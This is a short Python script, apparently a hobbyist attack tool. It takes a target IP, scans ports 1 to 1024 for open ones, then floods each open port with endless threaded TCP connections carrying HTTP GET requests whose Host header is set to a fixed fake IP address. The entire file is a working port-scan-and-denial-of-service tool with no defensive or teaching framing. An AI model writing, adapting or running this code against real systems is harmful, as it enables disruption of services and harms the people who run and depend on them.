import socket
from concurrent.futures import ThreadPoolExecutor
import threading

target_ip = input("Enter target: ")
open_ports = []
ports_to_scan = range(1, 1025)
fake_ip = '44.197.175.168'
Trd = int(input("Insert number of Threads for each DOS: "))

def port_scan(target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1) #set in on whatever you want to
    try:
        sock.connect((target_ip, target_port))
        open_ports.append(target_port)
    except socket.error:
        pass
    finally:
        sock.close()

def attack(port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
        print("Request sent to " + target_ip + "to port " + str(port) + "\n")
        s.close()

def thread_attack(ports):
    for i in range(Trd):
        thread = threading.Thread(target=attack, args=(ports,))
        thread.start()

def main():
    threads = []
    with ThreadPoolExecutor(max_workers= 20) as executor:
        executor.map(port_scan, ports_to_scan)

    if open_ports:
        print(f"Open ports: {open_ports} on {target_ip}")
        print("Launching DOS attack on the open ports")
        with ThreadPoolExecutor(max_workers= len(open_ports)) as executor:
            executor.map(thread_attack, open_ports)
    else: print(f"No open ports found on {target_ip}")

if __name__ == "__main__":
    main()